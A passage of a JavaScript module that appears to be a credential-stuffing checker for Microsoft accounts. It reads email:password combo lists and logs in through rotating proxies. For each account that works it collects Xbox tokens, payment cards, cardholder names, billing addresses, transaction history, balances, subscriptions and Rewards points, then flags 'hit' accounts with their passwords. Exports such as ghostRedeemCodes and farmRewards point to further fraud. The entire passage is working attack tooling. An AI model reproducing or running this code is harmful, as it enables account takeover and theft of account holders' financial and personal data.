          "&scope=service%3A%3Auser.auth.xboxlive.com%3A%3AMBI_SSL" +
          "&prompt=none";

        const { finalUrl: xUrl } = await sessionFetch(xblOauth, {
          headers: {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
            "Accept": "text/html,*/*",
            "Referer": "https://login.live.com/",
          },
        }, jar, ctx.signal);

        const rpsToken = decodeURIComponent(parseLR(xUrl, "access_token=", "&token_type") || "");
        if (!rpsToken) return { result: { status: "fail", user: email, reason: "XBL Token Fail" } };

        // XBL User Token
        const xblRes = await proxiedFetch("https://user.auth.xboxlive.com/user/authenticate", {
          method: "POST",
          headers: { "Content-Type": "application/json", "x-xbl-contract-version": "1" },
          body: JSON.stringify({
            RelyingParty: "http://auth.xboxlive.com",
            TokenType: "JWT",
            Properties: { AuthMethod: "RPS", SiteName: "user.auth.xboxlive.com", RpsTicket: `d=${rpsToken}` },
          }),
          signal: ctx.signal,
        });
        const xblData = await xblRes.json();
        const userToken = xblData.Token;
        uhs = xblData.DisplayClaims?.xui?.[0]?.uhs || "";

        // XSTS Token
        const xstsRes = await proxiedFetch("https://xsts.auth.xboxlive.com/xsts/authorize", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            RelyingParty: "http://xboxlive.com",
            TokenType: "JWT",
            Properties: { UserTokens: [userToken], SandboxId: "RETAIL" },
          }),
          signal: ctx.signal,
        });
        const xstsData = await xstsRes.json();
        xblAuth = `XBL3.0 x=${uhs};${xstsData.Token}`;
      } catch {
        return { result: { status: "fail", user: email, reason: "Xbox Auth Fail" } };
      }

      const xHeaders = {
        "Authorization": xblAuth,
        "x-xbl-contract-version": "2",
        "Accept": "application/json",
        "Accept-Language": "en-US",
      };

      // Check linked services
      const services = {};

      // Xbox Profile
      try {
        const profRes = await proxiedFetch(
          `https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag,GameDisplayPicRaw,Gamerscore,AccountTier,XboxOneRep`,
          { headers: xHeaders, signal: ctx.signal }
        );
        if (profRes.ok) {
          const profData = await profRes.json();
          const settings = profData.profileUsers?.[0]?.settings || [];
          services.Xbox = {
            linked: true,
            gamertag: settings.find(s => s.id === "Gamertag")?.value || "N/A",
            gamerscore: settings.find(s => s.id === "Gamerscore")?.value || "0",
            tier: settings.find(s => s.id === "AccountTier")?.value || "N/A",
            rep: settings.find(s => s.id === "XboxOneRep")?.value || "N/A",
          };
        }
      } catch {}

      // Game Pass / Subscriptions
      try {
        const gpRes = await proxiedFetch(
          "https://emerald.xboxservices.com/xboxcomfd/v3/offers?market=US&language=en-US",
          { headers: { ...xHeaders, "x-xbl-contract-version": "4" }, signal: ctx.signal }
        );
        if (gpRes.ok) {
          const gpData = await gpRes.json();
          const offers = gpData.offers || gpData.Offers || [];
          services.GamePass = {
            linked: offers.length > 0,
            offerCount: offers.length,
            titles: offers.slice(0, 5).map(o => o.title || o.Title || "Perk").join(", "),
          };
        }
      } catch {}

      // Minecraft (check via title history)
      try {
        const mcRes = await proxiedFetch(
          "https://titlehub.xboxlive.com/users/me/titles/titlehistory/decoration/achievement,stats",
          { headers: { ...xHeaders, "x-xbl-contract-version": "2" }, signal: ctx.signal }
        );
        if (mcRes.ok) {
          const mcData = await mcRes.json();
          const titles = mcData.titles || [];
          const minecraft = titles.find(t =>
            (t.name || "").toLowerCase().includes("minecraft") ||
            (t.titleId === "1739947436") || (t.titleId === "1810924247")
          );
          services.Minecraft = { linked: !!minecraft, title: minecraft?.name || "Not Found" };

          // EA Play detection
          const ea = titles.find(t =>
            (t.name || "").toLowerCase().includes("ea play") ||
            (t.name || "").toLowerCase().includes("ea access")
          );
          services.EAPlay = { linked: !!ea, title: ea?.name || "Not Found" };

          // Total games
          services.Library = {
            totalGames: titles.length,
            recent: titles.slice(0, 5).map(t => t.name || "Unknown").join(", "),
          };
        }
      } catch {}

      // Rewards points (already have session)
      try {
        const rwRes = await proxiedFetch("https://rewards.bing.com/", {
          headers: { "User-Agent": DESKTOP_UA, Cookie: jar.header() },
          signal: ctx.signal,
        });
        const rwSrc = await rwRes.text();
        services.Rewards = {
          linked: true,
          points: parseLR(rwSrc, ',"availablePoints":', ',"') || "0",
        };
      } catch {}

      const linkedCount = Object.values(services).filter(s => s && s.linked).length;

      return {
        result: {
          status: linkedCount > 0 ? "hit" : "empty",
          user: email,
          password: password,
          services,
          linkedCount,
        },
      };
    },
    onResult: (r, done, total) => {
      if (onProgress) onProgress(done, total, r);
    },
  });

  return results.filter(Boolean);
}


// ════════════════════════════════════════════════════════════
//  8. AIO SCANNER — Single login, all scans combined
// ════════════════════════════════════════════════════════════

async function aioScan(accounts, threads = 10, onProgress, signal) {
  const results = await runPool({
    items: accounts,
    concurrency: threads,
    maxRetries: 1,
    signal,
    scope: "beta-aio",
    runner: async (cred, ctx) => {
      const sep = cred.indexOf(":");
      if (sep < 0) return { result: { status: "fail", user: cred, reason: "Bad format" } };
      const email = cred.slice(0, sep);
      const password = cred.slice(sep + 1);

      // ── Single login for everything ──
      const login = await loginAccount(email, password, ctx.signal);
      if (!login.ok) return { result: { status: "fail", user: email, reason: login.reason } };

      const { token, jar } = login;
      const apiHeaders = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36",
        "Accept": "application/json",
        "Authorization": `MSADELEGATE1.0="${token}"`,
        "Origin": "https://account.microsoft.com",
        "Referer": "https://account.microsoft.com/",
        "Content-Type": "application/json",
        Cookie: jar.header(),
      };

      // ── Run all 4 scans in parallel on same session ──
      const [receiptData, paymentData, entitleData, bridgeData] = await Promise.allSettled([
        // 1. Receipts
        (async () => {
          const receipts = [];
          let cards = [];
          try {
            const txRes = await proxiedFetch(
              "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions",
              { headers: apiHeaders, signal: ctx.signal }
            );
            const txText = await txRes.text();
            const txMatches = txText.match(/"title":"[^"]*"/g) || [];
            const amountMatches = txText.match(/"totalAmount":\s*[\d.]+/g) || [];
            const dateMatches = txText.match(/"transactionDate":"[^"]*"/g) || [];
            const currencyMatches = txText.match(/"currency":"[^"]*"/g) || [];
            for (let i = 0; i < txMatches.length; i++) {
              receipts.push({
                title: txMatches[i]?.replace(/"title":"/, "").replace(/"$/, "") || "N/A",
                amount: amountMatches[i]?.replace(/"totalAmount":\s*/, "") || "0",
                date: dateMatches[i]?.replace(/"transactionDate":"/, "").replace(/"$/, "").split("T")[0] || "N/A",
                currency: currencyMatches[i]?.replace(/"currency":"/, "").replace(/"$/, "") || "",
              });
            }
          } catch {}
          try {
            const piRes = await proxiedFetch(
              "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US",
              { headers: apiHeaders, signal: ctx.signal }
            );
            const piText = await piRes.text();
            const cardNames = piText.match(/"display":\{"name":"[^"]*"/g) || [];
            const cardTypes = piText.match(/"paymentMethodFamily":"[^"]*"/g) || [];
            for (let i = 0; i < cardNames.length; i++) {
              cards.push({
                name: cardNames[i]?.replace(/"display":\{"name":"/, "").replace(/"$/, "") || "?",
                type: cardTypes[i]?.replace(/"paymentMethodFamily":"/, "").replace(/"$/, "") || "?",
              });
            }
          } catch {}
          return { receipts, cards, totalSpent: receipts.reduce((s, r) => s + parseFloat(r.amount || 0), 0).toFixed(2) };
        })(),

        // 2. Payment Arsenal
        (async () => {
          let balance = "0", ccInfo = "N/A", address = "N/A", paymentMethods = [], subscriptions = [], points = "0";
          try {
            const r1 = await proxiedFetch(
              "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US",
              { headers: apiHeaders, signal: ctx.signal }
            );
            const src1 = await r1.text();
            balance = parseLR(src1, 'balance":', ',"') || "0";
            const cardHolder = parseLR(src1, 'accountHolderName":"', '","') || "N/A";
            const cardDisplay = parseLR(src1, 'paymentMethodFamily":"credit_card","display":{"name":"', '"') || "N/A";
            const zipcode = parseLR(src1, '"postal_code":"', '",') || "N/A";
            const region = parseLR(src1, '"region":"', '",') || "N/A";
            const addr1 = parseLR(src1, '{"address_line1":"', '",') || "N/A";
            const city = parseLR(src1, '"city":"', '",') || "N/A";
            const country = parseLR(src1, '"country":"', '"') || "N/A";
            ccInfo = `${cardHolder} | ${cardDisplay}`;
            address = `${addr1}, ${city}, ${region} ${zipcode}, ${country}`;
            const pmFamilies = src1.match(/"paymentMethodFamily":"[^"]*"/g) || [];
            const pmNames = src1.match(/"display":\{"name":"[^"]*"/g) || [];
            const pmStatuses = src1.match(/"status":"[^"]*"/g) || [];
            for (let i = 0; i < pmFamilies.length; i++) {
              paymentMethods.push({
                type: pmFamilies[i]?.replace(/"paymentMethodFamily":"/, "").replace(/"$/, "") || "?",
                name: pmNames[i]?.replace(/"display":\{"name":"/, "").replace(/"$/, "") || "?",
                status: pmStatuses[i]?.replace(/"status":"/, "").replace(/"$/, "") || "?",
              });
            }
          } catch {}
          try {
            const r2 = await proxiedFetch(
              "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions",
              { headers: apiHeaders, signal: ctx.signal }
            );
            const src2 = await r2.text();
            const subTitles = src2.match(/"title":"[^"]*"/g) || [];
            const subRenews = src2.match(/"autoRenew":\s*(true|false)/g) || [];
            const subNextBill = src2.match(/"nextRenewalDate":"[^"]*"/g) || [];
            for (let i = 0; i < Math.min(subTitles.length, 10); i++) {
              subscriptions.push({
                title: subTitles[i]?.replace(/"title":"/, "").replace(/"$/, "") || "?",
                autoRenew: subRenews[i]?.includes("true") || false,
                nextBilling: subNextBill[i]?.replace(/"nextRenewalDate":"/, "").replace(/"$/, "").split("T")[0] || "N/A",
              });
            }
          } catch {}
          try {
            const r3 = await proxiedFetch("https://rewards.bing.com/", {
              headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", Cookie: jar.header() },
              signal: ctx.signal,
            });
            points = parseLR(await r3.text(), ',"availablePoints":', ',"') || "0";
          } catch {}
          return { balance, ccInfo, address, paymentMethods, subscriptions, points };
        })(),

        // 3. Entitlements
        (async () => {
          let entitlements = [];
          try {
            const r1 = await proxiedFetch(
              "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions",
              { headers: apiHeaders, signal: ctx.signal }
            );
            const src1 = await r1.text();
            const titles = src1.match(/"title":"[^"]*"/g) || [];
            const amounts = src1.match(/"totalAmount":\s*[\d.]+/g) || [];
            const dates = src1.match(/"startDate":"[^"]*"/g) || [];
            const currencies = src1.match(/"currency":"[^"]*"/g) || [];
            for (let i = 0; i < titles.length; i++) {
              entitlements.push({
                title: titles[i]?.replace(/"title":"/, "").replace(/"$/, "") || "N/A",
                amount: parseFloat(amounts[i]?.replace(/"totalAmount":\s*/, "") || "0"),
                date: dates[i]?.replace(/"startDate":"/, "").replace(/"$/, "").split("T")[0] || "N/A",
                currency: currencies[i]?.replace(/"currency":"/, "").replace(/"$/, "") || "",
              });
            }
          } catch {}
          return { entitlements, totalValue: entitlements.reduce((s, e) => s + e.amount, 0).toFixed(2) };
        })(),

        // 4. Linked Services (Xbox)
        (async () => {
          const services = {};
          try {
            const xblOauth = "https://login.live.com/oauth20_authorize.srf" +
              "?client_id=0000000048093EE3" +
              "&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf" +
              "&response_type=token" +
              "&scope=service%3A%3Auser.auth.xboxlive.com%3A%3AMBI_SSL" +
              "&prompt=none";
            const { finalUrl: xUrl } = await sessionFetch(xblOauth, {
              headers: {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
                "Accept": "text/html,*/*",
                "Referer": "https://login.live.com/",
              },
            }, jar, ctx.signal);
            const rpsToken = decodeURIComponent(parseLR(xUrl, "access_token=", "&token_type") || "");
            if (!rpsToken) throw new Error("no rps");

            const xblRes = await proxiedFetch("https://user.auth.xboxlive.com/user/authenticate", {
              method: "POST",
              headers: { "Content-Type": "application/json", "x-xbl-contract-version": "1" },
              body: JSON.stringify({
                RelyingParty: "http://auth.xboxlive.com",
                TokenType: "JWT",
                Properties: { AuthMethod: "RPS", SiteName: "user.auth.xboxlive.com", RpsTicket: `d=${rpsToken}` },
              }),
              signal: ctx.signal,
            });
            const xblData = await xblRes.json();
            const uhs = xblData.DisplayClaims?.xui?.[0]?.uhs || "";

            const xstsRes = await proxiedFetch("https://xsts.auth.xboxlive.com/xsts/authorize", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                RelyingParty: "http://xboxlive.com",
                TokenType: "JWT",
                Properties: { UserTokens: [xblData.Token], SandboxId: "RETAIL" },
              }),
              signal: ctx.signal,
            });
            const xstsData = await xstsRes.json();
            const xblAuth = `XBL3.0 x=${uhs};${xstsData.Token}`;
            const xHeaders = { "Authorization": xblAuth, "x-xbl-contract-version": "2", "Accept": "application/json" };

            // Xbox Profile
            try {
              const profRes = await proxiedFetch(
                `https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag,Gamerscore,AccountTier`,
                { headers: xHeaders, signal: ctx.signal }
              );
              if (profRes.ok) {
                const profData = await profRes.json();
                const s = profData.profileUsers?.[0]?.settings || [];
                services.Xbox = {
                  linked: true,
                  gamertag: s.find(x => x.id === "Gamertag")?.value || "N/A",
                  gamerscore: s.find(x => x.id === "Gamerscore")?.value || "0",
                  tier: s.find(x => x.id === "AccountTier")?.value || "N/A",
                };
              }
            } catch {}

            // Game Pass / Xbox Subscriptions — detect ALL tiers
            const xboxSubKeywords = [
              "game pass ultimate", "game pass core", "game pass essential", "game pass premium",
              "game pass standard", "pc game pass", "xbox game pass", "xbox live gold",
              "xbox live silver", "game pass for console", "ea play",
            ];
            // Check subscription titles from payment data for ALL tiers
            // (payment.subscriptions populated in parallel scan #2)

            // Also check emerald offers for Ultimate perks
            try {
              const gpRes = await proxiedFetch(
                "https://emerald.xboxservices.com/xboxcomfd/v3/offers?market=US&language=en-US",
                { headers: { ...xHeaders, "x-xbl-contract-version": "4" }, signal: ctx.signal }
              );
              if (gpRes.ok) {
                const gpData = await gpRes.json();
                const offers = gpData.offers || gpData.Offers || [];
                services.GamePass = { linked: offers.length > 0, offerCount: offers.length, tier: offers.length > 0 ? "Ultimate" : "None" };
              }
            } catch {}

            // Store keywords for subscription detection (used after all parallel scans)
            services._xboxSubKeywords = xboxSubKeywords;

            // Title History (Minecraft, EA)
            try {
              const mcRes = await proxiedFetch(
                "https://titlehub.xboxlive.com/users/me/titles/titlehistory/decoration/achievement,stats",
                { headers: { ...xHeaders, "x-xbl-contract-version": "2" }, signal: ctx.signal }
              );
              if (mcRes.ok) {
                const mcData = await mcRes.json();
                const titles = mcData.titles || [];
                const mc = titles.find(t => (t.name || "").toLowerCase().includes("minecraft") || t.titleId === "1739947436");
                services.Minecraft = { linked: !!mc, title: mc?.name || "N/A" };
                const ea = titles.find(t => (t.name || "").toLowerCase().includes("ea play"));
                services.EAPlay = { linked: !!ea };
                services.Library = { totalGames: titles.length };
              }
            } catch {}
          } catch {}

          // Rewards
          try {
            const rwRes = await proxiedFetch("https://rewards.bing.com/", {
              headers: { "User-Agent": DESKTOP_UA, Cookie: jar.header() },
              signal: ctx.signal,
            });
            services.Rewards = { linked: true, points: parseLR(await rwRes.text(), ',"availablePoints":', ',"') || "0" };
          } catch {}

          return { services, linkedCount: Object.values(services).filter(s => s?.linked).length };
        })(),
      ]);

      const receipt = receiptData.status === "fulfilled" ? receiptData.value : { receipts: [], cards: [], totalSpent: "0" };
      const payment = paymentData.status === "fulfilled" ? paymentData.value : { balance: "0", ccInfo: "N/A", address: "N/A", paymentMethods: [], subscriptions: [], points: "0" };
      const entitle = entitleData.status === "fulfilled" ? entitleData.value : { entitlements: [], totalValue: "0" };
      const bridge = bridgeData.status === "fulfilled" ? bridgeData.value : { services: {}, linkedCount: 0 };

      const hasContent = receipt.receipts.length > 0 || payment.paymentMethods.length > 0 ||
        parseFloat(payment.balance) > 0 || entitle.entitlements.length > 0 || bridge.linkedCount > 0 ||
        (payment.ccInfo !== "N/A" && payment.ccInfo !== "N/A | N/A");

      return {
        result: {
          status: hasContent ? "hit" : "empty",
          user: email,
          password,
          receipt,
          payment,
          entitle,
          bridge,
        },
      };
    },
    onResult: (r, done, total) => {
      if (onProgress) onProgress(done, total, r);
    },
  });

  return results.filter(Boolean);
}


module.exports = {
  snipeRegionalPrices,
  ghostRedeemCodes,
  mineReceipts,
  scanPaymentArsenal,
  scanEntitlements,
  farmRewards,
  scanLinkedServices,
  aioScan,
};
